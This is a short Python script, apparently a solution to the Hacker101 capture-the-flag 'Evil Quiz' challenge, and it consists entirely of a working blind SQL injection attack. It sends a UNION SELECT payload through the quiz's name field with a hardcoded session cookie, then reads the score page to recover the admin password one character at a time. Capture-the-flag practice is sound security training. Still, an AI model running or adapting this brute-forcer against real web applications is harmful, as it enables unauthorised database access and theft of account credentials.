import requests

url='https://d15c50b60103e5efbd704605423a3e07.ctf.hacker101.com/evil-quiz'
cookies={'quizsession': 'c5438a3a52a2eca5abb70f8f19afa4e2'}
alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!"£$%^&*()_+[];#,./{}:@~<>?'

def attack(password):
    index=len(password)+1
    for letter in alphabet:
        data={'name': "Jfjrir' union select 1,2,3,4 from admin where username ='admin' and ord(substr(password, %d, 1))='%d" % (index, ord(letter))}
        r = requests.post(url, cookies=cookies, data=data)
        r = requests.get(url + '/score', cookies=cookies)
        if 'There is 1 other' in r.text:
            return password + letter
    return password

password=''
while True:
    np=attack(password)
    if np == password:
        print("Password found: '%s'" % (password))
        break
    password=np